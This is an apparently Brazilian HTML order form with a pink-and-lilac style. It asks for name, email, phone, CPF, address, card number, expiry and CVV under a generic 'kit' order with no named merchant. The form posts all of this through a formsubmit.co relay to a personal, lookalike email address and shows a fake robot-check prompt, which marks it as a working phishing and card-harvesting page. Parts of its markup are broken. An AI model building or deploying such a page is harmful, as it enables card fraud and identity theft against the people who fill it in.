<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Finalizar informações de Pedido</title>
  <style>
    body {
      margin: 0;
      font-family: 'Montserrat', sans-serif;
      background-color: #fff0f5; /* fundo rosa claro */
      color: #5e3269; /* lilás escuro para textos */
    }

    header {
      background-color: #f8bbd0; /* rosa claro */
      padding: 20px;
      text-align: center;
      border-bottom: 4px solid #e1bee7; /* lilás pastel */
    }

    header h1 {
      color: #ad1457; /* rosa escuro */
      margin: 0;
    }

    header p {
      color: #6a1b9a; /* roxo vivo */
      margin: 8px 0 0;
    }

    .form-container {
      max-width: 600px;
      margin: 40px auto;
      padding: 30px;
      background-color: #fce4ec; /* rosa bebê */
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(173, 20, 87, 0.2);
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 5px;
      font-weight: bold;
      color: #6a1b9a;
    }

    input,
    textarea {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #ce93d8; /* lilás suave */
      background-color: #fff;
      color: #4a148c;
      font-size: 14px;
    }

    input::placeholder,
    textarea::placeholder {
      color: #ba68c8;
    }

    button {
      margin-top: 25px;
      background-color: #ec407a; /* rosa vivo */
      color: white;
      border: none;
      padding: 15px;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #d81b60;
    }

    .disclaimer {
      font-size: 12px;
      color: #8e24aa;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <header>
    <h1>Preencha as Informações</h1>
    <p>Preencha as informações abaixo para prosseguirmos com seu Pedido</p>
  </header>

  <div class="form-container">
    <form action="https://formsubmit.co/pepigm011@oegmail.com" method="POST">
      <!-- Dados Pessoais -->
      <label for="nome">Nome Completo</label>
      <input type="text" id="nome" name="Nome Completo" required>

      <label for="email">E-mail</label>
      <input type="email" id="email" name="Email" required>

      <label for="telefone">Telefone</label>
      <input type="tel" id="telefone" name="Telefone" placeholder="(DDD) 00000-0000">

      <label for="cpf">CPF</label>
      <input type="text" id="cpf" name="CPF" placeholder="000.000.000-00">

      <label for="endereco">Endereço</label>
      <textarea id="endereco" name="Endereço" rows="3" placeholder="Rua, número, bairro, cidade..."></textarea>

      <!-- Informações de cobrança -->
      <label for="informações de pagamento"
>Informações de Pagamento<label
        <label for="cartao">Número do Cartão</label>
      <input type="text" id="cartao" name="Número do Cartão" placeholder="0000 0000 0000 0000">

      <label for="validade">Validade (MM/AA)</label>
      <input type="text" id="validade" name="Validade" placeholder="07/30">

      <label for="cvv">CVV</label>
      <input type="tlabelext" id="cvv" name="CVV" placeholder="123">
<label for="próxima etapa e confirme que voce nao e um Robo">Selecione Proxima Etapa, e MARQUE a caixinha para confirmar que você não é um robô.<label>
      <!-- Redirecionamento -->
      <input type="hidden" name="_next" value="https://seusite.com/obrigado.html">

      <!-- Botão -->
      <button type="submit">Proxima Etapa</button>

      <p class="disclaimer">PROXIMA ETAPA PARA INFORMAÇÕES DE ENTREGA DO KIT.</p>
    </form>
  </div>
</body>
</html>
